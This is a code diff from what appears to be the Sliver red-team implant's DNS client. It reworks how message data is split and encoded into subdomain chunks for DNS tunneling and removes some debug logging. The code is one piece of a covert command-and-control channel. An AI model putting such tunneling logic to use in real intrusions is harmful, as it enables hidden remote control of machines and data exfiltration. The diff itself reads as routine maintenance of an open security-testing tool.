@@ -392,7 +392,7 @@ func (s *SliverDNSClient) Close() error {
 
 // serialSend - send a message serially (generally only used for init)
 func (s *SliverDNSClient) serialSend(resolver DNSResolver, encoder encoders.Encoder, msg *dnspb.DNSMessage, data []byte) ([]byte, error) {
-	allSubdata, err := s.splitBuffer(msg, encoder, s.subdataSpace, data)
+	allSubdata, err := s.splitBuffer(msg, encoder, data)
 	if err != nil {
 		return nil, err
 	}
@@ -490,26 +490,29 @@ func (s *SliverDNSClient) nextWorker() *DNSWorker {
 
 // There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
 // and check the length until we hit the limit
-func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, maxLength int, data []byte) ([]string, error) {
+func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, data []byte) ([]string, error) {
 	subdata := []string{}
 	start := 0
 	stop := start
+	lastLen := 0
 	var encoded string
 	for index := 0; stop < len(data); index++ {
 		if len(data) < index {
 			panic("boundary miscalculation") // We should always be able to encode more than one byte
 		}
-
-		// {{if .Config.Debug}}
-		log.Printf("[dns] loop #%d, start = %d, stop = %d", index, start, stop)
-		// {{end}}
 		msg.Start = uint32(start)
-		stop += int(maxLength / 2) // MaxLength - max length of pb metadata
+		if lastLen == 0 {
+			stop += int(float64(s.subdataSpace) / 2) // base32 overhead is about 160%
+		} else {
+			stop += (lastLen - 4) // max start uint32 overhead
+		}
 		if len(data) < stop {
 			stop = len(data) - 1 // make sure the loop is executed at least once
 		}
+
+		// Sometimes adding a byte will result in +2 chars so we -1 the subdata space
 		encoded = ""
-		for len(encoded) < maxLength && stop < len(data) {
+		for len(encoded) < (s.subdataSpace-1) && stop < len(data) {
 			stop++
 			// {{if .Config.Debug}}
 			log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
@@ -518,9 +521,10 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			pbMsg, _ := proto.Marshal(msg)
 			encoded = string(encoder.Encode(pbMsg))
 			// {{if .Config.Debug}}
-			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), maxLength)
+			log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), s.subdataSpace)
 			// {{end}}
 		}
+		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
 		domain, err := s.joinSubdataToParent(encoded)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -530,13 +534,7 @@ func (s *SliverDNSClient) splitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		}
 		subdata = append(subdata, domain)
 		start = stop
-		// {{if .Config.Debug}}
-		log.Printf("[dns] next start = %d", stop)
-		// {{end}}
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[dns] split subdata: %v", subdata)
-	// {{end}}
 	return subdata, nil
 }
 
